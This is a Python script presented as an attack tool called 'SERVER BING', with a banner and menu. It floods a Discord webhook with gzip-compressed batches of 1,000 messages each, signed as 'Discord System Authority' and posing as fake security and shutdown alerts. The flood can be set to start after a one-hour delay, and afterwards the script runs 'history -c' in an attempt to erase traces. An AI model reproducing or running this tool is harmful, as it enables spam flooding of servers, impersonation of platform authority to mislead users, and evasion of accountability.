import requests, json, gzip, io, os, sys, time

R = '\033[1;31m' 
G = '\033[1;32m' 
Y = '\033[1;33m' 
B = '\033[1;34m' 
C = '\033[1;36m' 
W = '\033[0m'    

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def show_interface():
    clear_screen()
    print(f"""
{R}  ____  _____ ______     _______ ____    ____ ___ _   _  ____ 
 / ___|| ____|  _ \ \   / / ____|  _ \  | __ )_ _| \ | |/ ___|
 \___ \|  _| | |_) \ \ / /|  _| | |_) | |  _ \| ||  \| | |  _ 
  ___) | |___|  _ < \ V / | |___|  _ <  | |_) | || |\  | |_| |
 |____/|_____|_| \_\ \_/  |_____|_| \_\ |____/___|_| \_|\____|
{W}
{C}  [#] Name: {W}SERVER BING (Zero-Payload)
{C}  [#] Author: {W}Dhiya Admin
{C}  [#] Effect: {R}Instant Pizza & Coke Explosion (Lag Protocol){W}
    """)
    print(f"{G}[01]{W} Launch Stealth Mission (1 Hour Timer)")
    print(f"{G}[02]{W} Instant Packet Explosion (Direct)")
    print(f"{G}[00]{W} Exit Tool")
    print(f"\n{R}───────────────────────────────────────────────────────────{W}")

def launch_mission():
    show_interface()
    choice = input(f"\n{R}BING-ADMIN {G}>> {W}")
    
    if choice == "00": 
        sys.exit()
        
    target_url = "YOUR_WEBHOOK_URL_HERE"
    
    if target_url == "YOUR_WEBHOOK_URL_HERE":
        print(f"\n{R}[X] Set Webhook URL in the script first!{W}")
        return

    eng_stages = [
        "[SYSTEM_CRITICAL] error_code_404: packet_leak_detected. initializing_repair_protocol_10min...",
        "[SECURITY_ALERT] unauthorized_bot_activity_detected. tracing_origin... check_external_nodes.",
        "[MAINTENANCE_NOTICE] emergency_shutdown_imminent. flushing_buffer_logs... connection_unstable.",
        "[SUCCESS] threat_neutralized. malicious_entities_purged. system_restored_to_normal."
    ]

    all_pkgs = []
    for text in eng_stages:
        payloads = [{"username": "Discord System Authority", "content": text} for _ in range(1000)]
        out = io.BytesIO()
        with gzip.GzipFile(fileobj=out, mode='w', compresslevel=9) as f:
            f.write(json.dumps(payloads).encode('utf-8'))
        all_pkgs.append(out.getvalue())

    if choice == "01":
        time.sleep(3600)

    headers = {'Content-Encoding': 'gzip', 'Content-Type': 'application/json'}
    for pkg in all_pkgs:
        try:
            requests.post(target_url, data=pkg, headers=headers, timeout=5)
        except: 
            pass
    
    os.system("history -c")
    print(f"\n{G}[#] MISSION COMPLETE.{W}")
    sys.exit()

if __name__ == "__main__":
    launch_mission()
    
